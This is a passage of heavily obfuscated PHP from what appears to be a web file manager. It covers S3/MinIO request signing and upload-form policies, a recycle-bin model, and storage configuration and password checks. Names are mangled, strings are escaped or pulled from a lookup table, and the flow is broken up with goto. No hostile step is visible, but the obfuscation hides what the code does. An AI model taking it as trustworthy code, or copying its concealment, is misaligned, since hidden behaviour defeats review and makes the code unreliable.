"\170\x2d\141\155\172\x2d\144\x61\164\145\x3a{$ŒĞëõ—ã}", $®ŸÛ»Ã¬[8] . $this->bucket . $®ŸÛ»Ã¬[8] . $this->pathEncode($¨›Ò›´Á) . $ïş«‹û´); $ğºÔ  = implode($®ŸÛ»Ã¬[287], $çü»ıÄ); $±Ëš¦¼ı = $this->client->__getSignature($ğºÔ ); return array($®ŸÛ»Ã¬[288] => $±Ëš¦¼ı, $®ŸÛ»Ã¬[284] => $ŒĞëõ—ã); } public function uploadListAuthV2($Şãş“ëà, $¥ÄÄïÁ¬ = array()) { $ş¢Éæ¬€ =& $_SERVER[Ï×Œõ”û]; $°£åŸáş = $¥ÄÄïÁ¬[$ş¢Éæ¬€[95]]; $Á¥´´ü” = $¥ÄÄïÁ¬[$ş¢Éæ¬€[283]]; $Ş£Öøöá = $this->client->listParts($this->bucket, $°£åŸáş, $Á¥´´ü”); if (!$Ş£Öøöá) { return !1; } $¯—¶ê = gmdate($ş¢Éæ¬€[281]); $ì‹Æ——› = $ş¢Éæ¬€[289] . $Á¥´´ü”; $Ãõá³îş = array($ş¢Éæ¬€[290], $ş¢Éæ¬€[12], $ş¢Éæ¬€[121], $ş¢Éæ¬€[12], "\170\55\141\x6d\172\x2d\x64\x61\164\x65\x3a{$¯—¶ê}", $ş¢Éæ¬€[8] . $this->bucket . $ş¢Éæ¬€[8] . $this->pathEncode($°£åŸáş) . $ì‹Æ——›); $ìª†óÎË = implode($ş¢Éæ¬€[287], $Ãõá³îş); $æÍ… ôÈ = $this->client->__getSignature($ìª†óÎË); return array($ş¢Éæ¬€[288] => $æÍ… ôÈ, $ş¢Éæ¬€[284] => $¯—¶ê, $ş¢Éæ¬€[291] => $Ş£Öøöá); } public function uploadPartAuthV4($Ü¡çÆÀÎ, $ş¼Ä¸úÊ = array()) { $ÉÉìÇ Ò =& $_SERVER[Ï×Œõ”û]; $Ü«‡Ü×» = $ş¼Ä¸úÊ[$ÉÉìÇ Ò[95]]; $Ê“İå” = array($ÉÉìÇ Ò[275] => gmdate($ÉÉìÇ Ò[282]), $ÉÉìÇ Ò[292] => _get($ş¼Ä¸úÊ, $ÉÉìÇ Ò[293], hash($ÉÉìÇ Ò[277], $ÉÉìÇ Ò[12]))); $§ı›À‡ª = explode($ÉÉìÇ Ò[210], $this->getHost()); $ç·Á®± = array($ÉÉìÇ Ò[294] => $§ı›À‡ª[1], $ÉÉìÇ Ò[295] => $ÉÉìÇ Ò[12], $ÉÉìÇ Ò[248] => $ÉÉìÇ Ò[121], $ÉÉìÇ Ò[296] => $ş¼Ä¸úÊ[$ÉÉìÇ Ò[79]]); $¾ÏÍÀ®„ = $ÉÉìÇ Ò[255]; $Ú„ÚÁ¨¯ = $ÉÉìÇ Ò[8] . $this->pathEncode($Ü«‡Ü×»); $õ·ğó›÷ = array_intersect_key($ş¼Ä¸úÊ, array_flip(array($ÉÉìÇ Ò[285], $ÉÉìÇ Ò[283]))); $íËø„·Õ = $this->client->__getSignatureV4($Ê“İå”, $ç·Á®±, $¾ÏÍÀ®„, $Ú„ÚÁ¨¯, $õ·ğó›÷); return array($ÉÉìÇ Ò[288] => $íËø„·Õ, $ÉÉìÇ Ò[292] => $Ê“İå”[$ÉÉìÇ Ò[292]], $ÉÉìÇ Ò[284] => $Ê“İå”[$ÉÉìÇ Ò[275]]); } public function uploadListAuthV4($œÆº¸ğÌ, $îÃ ÷Úº = array()) { $”ÒÉ•À =& $_SERVER[Ï×Œõ”û]; $”“¨éÑ = $îÃ ÷Úº[$”ÒÉ•À[95]]; $’ï¦¢Í© = $îÃ ÷Úº[$”ÒÉ•À[283]]; $ØğÃªïû = $this->client->listParts($this->bucket, $”“¨éÑ, $’ï¦¢Í©); if (!$ØğÃªïû) { return !1; } $ÜëÚ¹ÀÇ = $”ÒÉ•À[297]; foreach ($ØğÃªïû as $î“”¿©á) { $ÜëÚ¹ÀÇ .= $”ÒÉ•À[298] . "\74\120\141\x72\x74\x4e\165\155\142\145\x72\x3e{$î“”¿©á[$”ÒÉ•À[299]]}\74\57\x50\x61\x72\164\116\x75\x6d\x62\145\162\76\xa" . "\74\x45\x54\x61\x67\76{$î“”¿©á[$”ÒÉ•À[300]]}\74\x2f\105\124\x61\147\x3e\12" . $”ÒÉ•À[301]; } $ÜëÚ¹ÀÇ .= $”ÒÉ•À[302]; $ÜÃëÚ‰ = array($”ÒÉ•À[275] => gmdate($”ÒÉ•À[282]), $”ÒÉ•À[292] => hash($”ÒÉ•À[277], $ÜëÚ¹ÀÇ)); $½¿¯Ê„Ò = explode($”ÒÉ•À[210], $this->getHost()); $ø£™àÌ€ = array($”ÒÉ•À[294] => $½¿¯Ê„Ò[1], $”ÒÉ•À[248] => $”ÒÉ•À[121], $”ÒÉ•À[296] => strlen($ÜëÚ¹ÀÇ)); $©äæèé© = $”ÒÉ•À[290]; $›Ù‚¬³™ = $”ÒÉ•À[8] . $this->pathEncode($”“¨éÑ); $«êöÀ‘Ò = array($”ÒÉ•À[283] => $’ï¦¢Í©); $à«æóíæ = $this->client->__getSignatureV4($ÜÃëÚ‰, $ø£™àÌ€, $©äæèé©, $›Ù‚¬³™, $«êöÀ‘Ò); return array($”ÒÉ•À[288] => $à«æóíæ, $”ÒÉ•À[292] => $ÜÃëÚ‰[$”ÒÉ•À[292]], $”ÒÉ•À[284] => $ÜÃëÚ‰[$”ÒÉ•À[275]], $”ÒÉ•À[291] => $ØğÃªïû); } private function _isClientAsync() { $Ûõ¼ËÀ„ =& $_SERVER[Ï×Œõ”û]; static $†‰ÜÑõü = null; if ($†‰ÜÑõü === null) { $º–¯íèÂ = isset($_REQUEST[$Ûõ¼ËÀ„[303]]) ? json_decode($_REQUEST[$Ûõ¼ËÀ„[303]], !0) : !1; $†‰ÜÑõü = $º–¯íèÂ && _get($º–¯íèÂ, $Ûõ¼ËÀ„[304]) == $Ûõ¼ËÀ„[305]; } return $†‰ÜÑõü; } public function getHost() { $Í´ã½…ƒ =& $_SERVER[Ï×Œõ”û]; $§ôÜÖºØ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($Í´ã½…ƒ[70], $Í´ã½…ƒ[64], $Í´ã½…ƒ[69], $Í´ã½…ƒ[62]))) { return $§ôÜÖºØ . $Í´ã½…ƒ[8] . $this->bucket; } if ($this->osType == $Í´ã½…ƒ[62] && !is_domain($§ôÜÖºØ)) { return $§ôÜÖºØ . $Í´ã½…ƒ[8] . $this->bucket; } $§ôÜÖºØ = explode($Í´ã½…ƒ[210], $§ôÜÖºØ); return $§ôÜÖºØ[0] . $Í´ã½…ƒ[210] . $this->bucket . $Í´ã½…ƒ[10] . $§ôÜÖºØ[1]; } public function size($³®ÖÔº¼) { $Ÿ©Û½İ• = $this->objectMeta($³®ÖÔº¼); return $Ÿ©Û½İ• ? $Ÿ©Û½İ•[$_SERVER[Ï×Œõ”û][79]] : 0; } public function info($³Ñâ¾—£) { if ($this->isFolder($³Ñâ¾—£)) { return $this->folderInfo($³Ñâ¾—£); } else { if ($this->isFile($³Ñâ¾—£)) { return $this->fileInfo($³Ñâ¾—£); } } return !1; } public function exist($®¥üú») { return $this->isFile($®¥üú») || $this->isFolder($®¥üú»); } public function isFile($ ƒÑçÕ) { return !$this->isFolder($ ƒÑçÕ) && $this->objectMeta($ ƒÑçÕ); } public function isFolder($åë¬–†ö) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][179], $åë¬–†ö); } protected function objectMeta($×±ËìÖø) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][181], $×±ËìÖø); } protected function _objectMeta($‰ÛŒ¶Á) { $„Ğã¿§ =& $_SERVER[Ï×Œõ”û]; $‰ÛŒ¶Á = rtrim($‰ÛŒ¶Á, $„Ğã¿§[8]); try { $´Â“¾ÊÈ = $this->client->getObjectInfo($this->bucket, $‰ÛŒ¶Á); if (!isset($´Â“¾ÊÈ[$„Ğã¿§[254]]) && isset($´Â“¾ÊÈ[$„Ğã¿§[306]])) { $´Â“¾ÊÈ[$„Ğã¿§[254]] = $´Â“¾ÊÈ[$„Ğã¿§[306]]; } } catch (Exception $‡ˆ›¼ø) { $´Â“¾ÊÈ = !1; } if (!$´Â“¾ÊÈ) { } return $´Â“¾ÊÈ; } protected function _isFolder($™ÌüşĞ) { $ì³“ïö¶ =& $_SERVER[Ï×Œõ”û]; $™ÌüşĞ = rtrim($™ÌüşĞ, $ì³“ïö¶[8]) . $ì³“ïö¶[8]; if ($™ÌüşĞ == $ì³“ïö¶[12] || $™ÌüşĞ == $ì³“ïö¶[8]) { return !0; } $şÒ±„‹Ê = $this->client->getBucket($this->bucket, $™ÌüşĞ, null, 1); if (empty($şÒ±„‹Ê[$ì³“ïö¶[238]])) { return !1; } $—„èÚõ‘ = $şÒ±„‹Ê[$ì³“ïö¶[238]][0][$ì³“ïö¶[32]]; return stripos($—„èÚõ‘, $™ÌüşĞ) === 0 ? !0 : !1; if (substr($—„èÚõ‘, -1) == $ì³“ïö¶[8]) { return !0; } if (get_path_this($—„èÚõ‘) == get_path_this($™ÌüşĞ)) { return !1; } return !0; } public function listObject($šàÂ•¯) { return $this->fileList($šàÂ•¯, $_SERVER[Ï×Œõ”û][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($¼Ë‹ˆÇú) { $¤÷Áü÷² =& $_SERVER[Ï×Œõ”û]; parent::__construct($¼Ë‹ˆÇú); $this->setSignVersion($¤÷Áü÷²[249]); if (!$this->region) { $this->region = $¤÷Áü÷²[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ÓÓ¤¿ = $this->getBktRegion(); return $this->region == $ÓÓ¤¿ ? !0 : !1; } public function uploadFormData($İË¡Ğ–ò, $ÃÔãŸûâ = 3600) { $å¼´ÌË =& $_SERVER[Ï×Œõ”û]; $²‘ĞÆÚ = $å¼´ÌË[231]; $°ÊŒš†ş = $å¼´ÌË[259]; $í—„”ä“ = $å¼´ÌË[62]; $™‡ºí÷€ = gmdate($å¼´ÌË[260]); $ñ¤†Ú«¬ = gmdate($å¼´ÌË[261]); $çÊ‘‘» = $å¼´ÌË[262]; $¿ı“Øƒ¤ = $ÃÔãŸûâ . $å¼´ÌË[12]; $ğÍšÕ­º = $å¼´ÌË[263]; $¢˜èå“Š = array($this->accessKey, $ñ¤†Ú«¬, $this->region, $í—„”ä“, $çÊ‘‘»); $æè»Š•° = implode($å¼´ÌË[8], $¢˜èå“Š); $àÊ÷¬«ë = array($å¼´ÌË[264] => gmdate($å¼´ÌË[265], strtotime($å¼´ÌË[266])), $å¼´ÌË[267] => array(array($å¼´ÌË[268] => $this->bucket), array($å¼´ÌË[308] => $²‘ĞÆÚ), array($å¼´ÌË[269], $å¼´ÌË[270], $å¼´ÌË[12]), array($å¼´ÌË[269], $å¼´ÌË[271], $å¼´ÌË[12]), array($å¼´ÌË[269], $å¼´ÌË[309], $å¼´ÌË[12]), array($å¼´ÌË[272] => $ğÍšÕ­º), array($å¼´ÌË[273] => $æè»Š•°), array($å¼´ÌË[274] => $°ÊŒš†ş), array($å¼´ÌË[275] => $™‡ºí÷€), array($å¼´ÌË[276] => $¿ı“Øƒ¤))); $§ü¶ÌÈÛ = base64_encode(json_encode($àÊ÷¬«ë)); $´Å±ÜŠ = hash_hmac($å¼´ÌË[277], $ñ¤†Ú«¬, $å¼´ÌË[278] . $this->secret, !0); $ÑØ‘ˆ°ç = hash_hmac($å¼´ÌË[277], $this->region, $´Å±ÜŠ, !0); $¿»„°¾ö = hash_hmac($å¼´ÌË[277], $í—„”ä“, $ÑØ‘ˆ°ç, !0); $ÔàöŠ¤Á = hash_hmac($å¼´ÌË[277], $çÊ‘‘», $¿»„°¾ö, !0); $ˆÕò•±Í = hash_hmac($å¼´ÌË[277], $§ü¶ÌÈÛ, $ÔàöŠ¤Á); $Şİ ü˜÷ = array($å¼´ÌË[248] => $å¼´ÌË[12], $å¼´ÌË[296] => $å¼´ÌË[12], $å¼´ÌË[308] => $²‘ĞÆÚ, $å¼´ÌË[272] => $ğÍšÕ­º, $å¼´ÌË[279] => $§ü¶ÌÈÛ, $å¼´ÌË[310] => $æè»Š•°, $å¼´ÌË[311] => $°ÊŒš†ş, $å¼´ÌË[312] => $™‡ºí÷€, $å¼´ÌË[313] => $¿ı“Øƒ¤, $å¼´ÌË[314] => $ˆÕò•±Í, $å¼´ÌË[208] => $this->getHost()); return $Şİ ü˜÷; } } goto E¹ë±…‚‚†; CÊƒÈ’à¾: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\x75\162\x63\145\x5f\x72\145\143\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\145\x61\164\x65\124\x69\155\x65", "\164\151\x6d\145", "\151\156\163\145\x72\x74", "\x66\x75\156\x63\x74\x69\x6f\156")); public function listData($İ¾ÆÜá­ = false) { $ÚÏÔ¯ş =& $_SERVER[Ï×Œõ”û]; $İ¾ÆÜá­ = $İ¾ÆÜá­ ? $İ¾ÆÜá­ : USER_ID; $¿ù¸×öë = $this->where(array($ÚÏÔ¯ş[1921] => $İ¾ÆÜá­))->select(); return array_to_keyvalue($¿ù¸×öë, $ÚÏÔ¯ş[12], $ÚÏÔ¯ş[193]); } public function moveToRecycle($ù€»¹”ƒ) { $Ò¼²­‘ =& $_SERVER[Ï×Œõ”û]; $âîîó· = Model($Ò¼²­‘[1487]); $÷¥ƒ‡Ñ„ = $âîîó·->sourceInfo($ù€»¹”ƒ); if (!$÷¥ƒ‡Ñ„ || $÷¥ƒ‡Ñ„[$Ò¼²­‘[525]] == $Ò¼²­‘[91]) { return; } $åÛˆì³Í = array($Ò¼²­‘[511] => $ù€»¹”ƒ, $Ò¼²­‘[1921] => USER_ID, $Ò¼²­‘[676] => $÷¥ƒ‡Ñ„[$Ò¼²­‘[190]], $Ò¼²­‘[677] => $÷¥ƒ‡Ñ„[$Ò¼²­‘[594]], $Ò¼²­‘[680] => $÷¥ƒ‡Ñ„[$Ò¼²­‘[609]]); $this->add($åÛˆì³Í); $this->recycleMove($ù€»¹”ƒ, 1); if ($÷¥ƒ‡Ñ„[$Ò¼²­‘[505]] == $Ò¼²­‘[91]) { $Üäó¼‘Ó = array($Ò¼²­‘[680] => array($Ò¼²­‘[640], $÷¥ƒ‡Ñ„[$Ò¼²­‘[609]] . $ù€»¹”ƒ . $Ò¼²­‘[641])); $âîîó·->where($Üäó¼‘Ó)->setField($Ò¼²­‘[525], 1); } } public function clear() { $this->remove(!1); } public function remove($²ÊÂÌí = false, $‘ ö©ù = false) { $åÑşñ‚ =& $_SERVER[Ï×Œõ”û]; $‘ ö©ù = $‘ ö©ù ? $‘ ö©ù : USER_ID; $Íæ‰ªÚÍ = Model($åÑşñ‚[1487]); $›ÀÄø°» = $this->listData($‘ ö©ù); $²ÊÂÌí = $²ÊÂÌí === !1 ? !1 : $²ÊÂÌí; $áú•¸²ß = array(); foreach ($›ÀÄø°» as $ø” ÂÈ×) { if ($²ÊÂÌí != !1 && !in_array($ø” ÂÈ×, $²ÊÂÌí)) { continue; } $†€îïÚŞ = $Íæ‰ªÚÍ->sourceInfo($ø” ÂÈ×); $Íæ‰ªÚÍ->remove($ø” ÂÈ×, !1); $ç‘‡™³¸ = $†€îïÚŞ[$åÑşñ‚[190]] . $åÑşñ‚[11] . $†€îïÚŞ[$åÑşñ‚[594]]; $áú•¸²ß[$ç‘‡™³¸] = array($åÑşñ‚[676] => $†€îïÚŞ[$åÑşñ‚[190]], $åÑşñ‚[594] => $†€îïÚŞ[$åÑşñ‚[594]]); $this->where(array($åÑşñ‚[193] => $ø” ÂÈ×))->delete(); } foreach ($áú•¸²ß as $ºùŒÜ‚±) { $Íæ‰ªÚÍ->targetSpaceUpdate($ºùŒÜ‚±[$åÑşñ‚[190]], $ºùŒÜ‚±[$åÑşñ‚[594]]); } } public function restore($å³åœË“ = false) { $¬óú†­Ô = $this->listData(); $this->_restoreSource($¬óú†­Ô, $å³åœË“); } public function removeUserAll($´ÏÊİ˜Ä) { $this->remove(!1, $´ÏÊİ˜Ä); } public function restoreItem($›’œä¿) { $this->_restoreSource(array($›’œä¿), array($›’œä¿)); } private function _restoreSource($¤õúúÔ, $áèÉö) { $ØË¯Ñõ¶ =& $_SERVER[Ï×Œõ”û]; $¾¼áÛŸÏ = Model($ØË¯Ñõ¶[1487]); $áèÉö = $áèÉö == !1 ? !1 : $áèÉö; if (!$¤õúúÔ) { return !0; } $ß•ôŒ™ = array(); foreach ($¤õúúÔ as $„ÚİÊ©”) { if ($áèÉö != !1 && !in_array($„ÚİÊ©”, $áèÉö)) { continue; } $êå¡¿—Ú = $¾¼áÛŸÏ->sourceInfo($„ÚİÊ©”); $¶ï‘½Öğ = $¾¼áÛŸÏ->sourceInfo($êå¡¿—Ú[$ØË¯Ñõ¶[192]]); if ($¶ï‘½Öğ[$ØË¯Ñõ¶[525]] == $ØË¯Ñõ¶[91]) { continue; } $¾¼áÛŸÏ->lockMoveStart($„ÚİÊ©”); $this->recycleMove($„ÚİÊ©”, 0); if ($êå¡¿—Ú[$ØË¯Ñõ¶[505]] == $ØË¯Ñõ¶[91]) { $áé…ç = array($ØË¯Ñõ¶[680] => array($ØË¯Ñõ¶[640], $êå¡¿—Ú[$ØË¯Ñõ¶[609]] . $„ÚİÊ©” . $ØË¯Ñõ¶[641])); $¾¼áÛŸÏ->where($áé…ç)->setField($ØË¯Ñõ¶[525], 0); $this->restoreFolderChildren($„ÚİÊ©”, $¤õúúÔ); } $this->where(array($ØË¯Ñõ¶[193] => $„ÚİÊ©”))->delete(); $¾¼áÛŸÏ->folderSizeReset($êå¡¿—Ú[$ØË¯Ñõ¶[192]]); $ß•ôŒ™[] = $êå¡¿—Ú[$ØË¯Ñõ¶[192]]; if ($êå¡¿—Ú[$ØË¯Ñõ¶[505]] == $ØË¯Ñõ¶[91]) { $ß•ôŒ™[] = $„ÚİÊ©”; } $¾¼áÛŸÏ->lockMoveEnd($„ÚİÊ©”); } $¾¼áÛŸÏ->updateModifyTime($ß•ôŒ™); } private function restoreFolderChildren($ä¶”üƒæ, $šÏÃúâÓ) { $‡æğ„¬€ =& $_SERVER[Ï×Œõ”û]; $·ßŠ¯ = Model($‡æğ„¬€[1487]); $¸åï—Ş› = array($‡æğ„¬€[193] => array($‡æğ„¬€[7], array())); foreach ($šÏÃúâÓ as $İ¬«Á¾Î) { if ($İ¬«Á¾Î == $ä¶”üƒæ) { continue; } if (!$·ßŠ¯->isParentOf($ä¶”üƒæ, $İ¬«Á¾Î)) { continue; } $¾¨ò÷à± = $·ßŠ¯->sourceInfo($İ¬«Á¾Î); if ($¾¨ò÷à±[$‡æğ„¬€[505]] == $‡æğ„¬€[91]) { $¸åï—Ş›[] = array($‡æğ„¬€[680] => array($‡æğ„¬€[640], $¾¨ò÷à±[$‡æğ„¬€[609]] . $İ¬«Á¾Î . $‡æğ„¬€[641])); } else { $¸åï—Ş›[$‡æğ„¬€[193]][1][] = $İ¬«Á¾Î; } } if (!$¸åï—Ş›[$‡æğ„¬€[193]][1]) { unset($¸åï—Ş›[$‡æğ„¬€[193]]); } if (!$¸åï—Ş›) { return; } if (is_array($¸åï—Ş›[$‡æğ„¬€[193]]) && is_array($¸åï—Ş›[$‡æğ„¬€[193]][1])) { $¸åï—Ş›[$‡æğ„¬€[193]][1] = array_unique($¸åï—Ş›[$‡æğ„¬€[193]][1]); } $¸åï—Ş›[$‡æğ„¬€[1121]] = $‡æğ„¬€[2237]; $·ßŠ¯->where($¸åï—Ş›)->setField($‡æğ„¬€[525], 1); } private function recycleMove($äôôåùò, $â¨Ñòº = 1) { $¸ğ•îÒ” =& $_SERVER[Ï×Œõ”û]; $»³ú›·× = Model($¸ğ•îÒ”[1487]); $ ÎÜ¸ı² = Model($¸ğ•îÒ”[2469]); $¡Ë”ïÈ = array($¸ğ•îÒ”[193] => $äôôåùò); if ($â¨Ñòº) { $»³ú›·×->where($¡Ë”ïÈ)->setField($¸ğ•îÒ”[525], 1); $ ÎÜ¸ı²->eventRecycle($äôôåùò, $¸ğ•îÒ”[2470]); } else { $–»ï€è° = $»³ú›·×->where($¡Ë”ïÈ)->find(); $ÕŠÒ¦åÂ = $–»ï€è°[$¸ğ•îÒ”[505]] == $¸ğ•îÒ”[91]; $«ÚÚÓã’ = $»³ú›·×->fileNameAuto($–»ï€è°[$¸ğ•îÒ”[192]], $–»ï€è°[$¸ğ•îÒ”[32]], REPEAT_RENAME_FOLDER, $ÕŠÒ¦åÂ); if ($«ÚÚÓã’ != $–»ï€è°[$¸ğ•îÒ”[32]]) { $»³ú›·×->rename($äôôåùò, $«ÚÚÓã’); } $»³ú›·×->where($¡Ë”ïÈ)->setField($¸ğ•îÒ”[525], 0); $ ÎÜ¸ı²->eventRecycle($äôôåùò, $¸ğ•îÒ”[2471]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\56\163\157\x75\162\143\145\123\145\143\x72\x65\164\114\151\163\x74"; public $field = array("\163\x6f\x75\x72\x63\x65\111\x44", "\164\x79\x70\145\111\104", "\143\x72\145\x61\x74\x65\125\163\x65\x72"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\155\56\x73\x74\x6f\x72\141\x67\x65\114\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x73\x69\172\145\115\x61\170", "\163\171\x73\x74\x65\x6d", "\144\x65\x66\x61\165\154\x74", "\x64\162\x69\166\145\162", "\143\157\x6e\146\151\147"); public function listData($Õã†¶‰‘ = false, $˜œ°…°¸ = "\x6d\x6f\144\151\146\171\x54\x69\x6d\x65", $ï¡³ÚÒ° = false) { $‡›¸Åğ‰ =& $_SERVER[Ï×Œõ”û]; $Ä‡·ûÀÍ = parent::listData($Õã†¶‰‘, $˜œ°…°¸, $ï¡³ÚÒ°); if ($Õã†¶‰‘) { return $Ä‡·ûÀÍ; } $ÀçãòÖ = array(); if ($GLOBALS[$‡›¸Åğ‰[2472]]) { $ÀçãòÖ = $this->ioSizeUseGet(array_to_keyvalue($Ä‡·ûÀÍ, $‡›¸Åğ‰[12], $‡›¸Åğ‰[484])); } foreach ($Ä‡·ûÀÍ as $çøÓù† => $Æ ÍŒÎ…) { unset($Ä‡·ûÀÍ[$çøÓù†][$‡›¸Åğ‰[6]]); $Ä‡·ûÀÍ[$çøÓù†][$‡›¸Åğ‰[2126]] = isset($ÀçãòÖ[$Æ ÍŒÎ…[$‡›¸Åğ‰[484]]]) ? $ÀçãòÖ[$Æ ÍŒÎ…[$‡›¸Åğ‰[484]]] : 0; } return $Ä‡·ûÀÍ; } public function ioSizeUseGet($¸²«¦Ü›) { $ñ®ÄÄ¥Ç =& $_SERVER[Ï×Œõ”û]; if (!$¸²«¦Ü›) { return array(); } $úÔ—ÜØ÷ = $ñ®ÄÄ¥Ç[2473] . implode($ñ®ÄÄ¥Ç[50], $¸²«¦Ü›); $Û£ü§¡ğ = Cache::get($úÔ—ÜØ÷); if ($Û£ü§¡ğ) { return $Û£ü§¡ğ; } $Å™Ü·šÍ = array($ñ®ÄÄ¥Ç[932] => $ñ®ÄÄ¥Ç[484], $ñ®ÄÄ¥Ç[2474] => $ñ®ÄÄ¥Ç[79]); $à³ı¾ÖÉ = array($ñ®ÄÄ¥Ç[932] => array($ñ®ÄÄ¥Ç[7], $¸²«¦Ü›)); $Û£ü§¡ğ = Model($ñ®ÄÄ¥Ç[900])->field($Å™Ü·šÍ)->where($à³ı¾ÖÉ)->group($ñ®ÄÄ¥Ç[932])->select(); $Û£ü§¡ğ = array_to_keyvalue($Û£ü§¡ğ, $ñ®ÄÄ¥Ç[484], $ñ®ÄÄ¥Ç[79]); Cache::set($úÔ—ÜØ÷, $Û£ü§¡ğ, 600); return $Û£ü§¡ğ; } public function getConfig($İ—ƒõÒİ) { $’èë‡Ä» = parent::listData($İ—ƒõÒİ); $ÍŞéºÉ¢ = _get($’èë‡Ä», $_SERVER[Ï×Œõ”û][6], array()); if ($ÍŞéºÉ¢ && !is_array($ÍŞéºÉ¢)) { $ÍŞéºÉ¢ = json_decode($ÍŞéºÉ¢, !0); } return $ÍŞéºÉ¢; } public function update($·úÈ×ã¦, $¤‡Î¹¬’) { $¥†ó„«Ó =& $_SERVER[Ï×Œõ”û]; $ÕÖÚÃß˜ = $¤‡Î¹¬’[$¥†ó„«Ó[32]]; $Š®ñ˜ô§ = array_to_keyvalue(parent::listData(), $¥†ó„«Ó[32]); if (isset($Š®ñ˜ô§[$ÕÖÚÃß˜]) && $Š®ñ˜ô§[$ÕÖÚÃß˜][$¥†ó„«Ó[484]] != $·úÈ×ã¦) { return !1; } $this->checkPwd($·úÈ×ã¦, $¤‡Î¹¬’); if (isset($¤‡Î¹¬’[$¥†ó„«Ó[2475]]) && $¤‡Î¹¬’[$¥†ó„«Ó[2475]] == $¥†ó„«Ó[91]) { $this->checkConfig($¤‡Î¹¬’); } unset($¤‡Î¹¬’[$¥†ó„«Ó[2475]]); $õëıÍö× = parent::update($·úÈ×ã¦, $¤‡Î¹¬’); if ($õëıÍö× && $¤‡Î¹¬’[$¥†ó„«Ó[37]]) { foreach ($Š®ñ˜ô§ as $¶¨Ìê–õ) { if ($¶¨Ìê–õ[$¥†ó„«Ó[37]] && $¶¨Ìê–õ[$¥†ó„«Ó[484]] != $·úÈ×ã¦) { parent::update($¶¨Ìê–õ[$¥†ó„«Ó[484]], array($¥†ó„«Ó[37] => 0)); } } $this->updateBackup($·úÈ×ã¦, $Š®ñ˜ô§); } return $õëıÍö×; } public function add($’Ö±ßí) { $–—åş”¤ =& $_SERVER[Ï×Œõ”û]; $”œö³ø = array_to_keyvalue(parent::listData(), $–—åş”¤[32]); if (isset($”œö³ø[$’Ö±ßí[$–—åş”¤[32]]])) { return !1; } $this->checkConfig($’Ö±ßí); $şü¬ëÇ = parent::insert($’Ö±ßí); if ($şü¬ëÇ && $’Ö±ßí[$–—åş”¤[37]]) { foreach ($”œö³ø as $Ø±–ôÑ) { if ($Ø±–ôÑ[$–—åş”¤[37]]) { parent::update($Ø±–ôÑ[$–—åş”¤[484]], array($–—åş”¤[37] => 0)); } } $this->updateBackup($şü¬ëÇ, $”œö³ø); } return $şü¬ëÇ; } public function updateBackup($óİ˜„‚æ, $ÂæÙ®ŞÕ) { $¨ÊØØÙŸ =& $_SERVER[Ï×Œõ”û]; if ($óİ˜„‚æ == $¨ÊØØÙŸ[91]) { return; } $œ²£ñ“ = Model($¨ÊØØÙŸ[854])->config(); $«áªÚ¶  = $œ²£ñ“[$¨ÊØØÙŸ[858]]; if ($œ²£ñ“[$¨ÊØØÙŸ[1900]] != $¨ÊØØÙŸ[91] || $«áªÚ¶  == $óİ˜„‚æ) { return; } if ($«áªÚ¶  != $¨ÊØØÙŸ[91]) { $‰‰õ´Ôó = array(); foreach ($ÂæÙ®ŞÕ as $ÂƒâÁª) { if ($óİ˜„‚æ == $ÂƒâÁª[$¨ÊØØÙŸ[484]]) { continue; } $‰‰õ´Ôó[] = $ÂƒâÁª[$¨ÊØØÙŸ[484]]; } if ($‰‰õ´Ôó && in_array($«áªÚ¶ , $‰‰õ´Ôó)) { return; } } $ïéğ‹¯± = Model($¨ÊØØÙŸ[879])->get($¨ÊØØÙŸ[886]); $ïéğ‹¯± = json_decode($ïéğ‹¯±, !0); if (!$ïéğ‹¯±) { return; } $ïéğ‹¯±[$¨ÊØØÙŸ[858]] = $óİ˜„‚æ; Model($¨ÊØØÙŸ[879])->set(array($¨ÊØØÙŸ[886] => $ïéğ‹¯±)); } public function checkPwd($ö³¤èôí, &$ÅøÑĞÆò) { $İÄ«õÍÔ =& $_SERVER[Ï×Œõ”û]; if (empty($ÅøÑĞÆò[$İÄ«õÍÔ[6]])) { return; } $ÄÆ·ƒùª = $ÅøÑĞÆò[$İÄ«õÍÔ[6]]; if (!is_array($ÄÆ·ƒùª)) { $ÄÆ·ƒùª = json_decode($ÄÆ·ƒùª, !0); } $Ñğƒæ­ = $İÄ«õÍÔ[12]; $×Õæ¦×Œ = array($İÄ«õÍÔ[1595], $İÄ«õÍÔ[2476], $İÄ«õÍÔ[1007]); foreach ($×Õæ¦×Œ as $ÖŠªú™Ø) { if (isset($ÄÆ·ƒùª[$ÖŠªú™Ø])) { $Ñğƒæ­ = $ÖŠªú™Ø; break; } } if (!$Ñğƒæ­) { return; } $ÊùÓ­¢á = $this->getConfig($ö³¤èôí); $¨§ºÒ»ö = $ÊùÓ­¢á[$Ñğƒæ­]; $Êî—š½ß = $ÄÆ·ƒùª[$Ñğƒæ­]; if ($Êî—š½ß == str_repeat($İÄ«õÍÔ[222], strlen($¨§ºÒ»ö))) { $ÄÆ·ƒùª[$Ñğƒæ­] = $¨§ºÒ»ö; $ÅøÑĞÆò[$İÄ«õÍÔ[6]] = json_encode($ÄÆ·ƒùª); } else { if ($Êî—š½ß != $¨§ºÒ»ö) { $ÅøÑĞÆò[$İÄ«õÍÔ[2475]] = $İÄ«õÍÔ[91]; } } } public function checkConfig(&$±Ó±Óƒœ, $šÒºš÷ = false) { $¬“¡õ¶æ =& $_SERVER[Ï×Œõ”û]; $®ì×”¸ = strtolower($±Ó±Óƒœ[$¬“¡õ¶æ[96]]); $ÏåÄÚ… = $±Ó±Óƒœ[$¬“¡õ¶æ[6]]; if (!is_array($ÏåÄÚ…)) { $ÏåÄÚ… = json_decode($ÏåÄÚ…, !0); } foreach ($ÏåÄÚ… as $ˆøÔÀ« => $Ó„ƒÏí) { if (is_string($Ó„ƒÏí)) { $ÏåÄÚ…[$ˆøÔÀ«] = 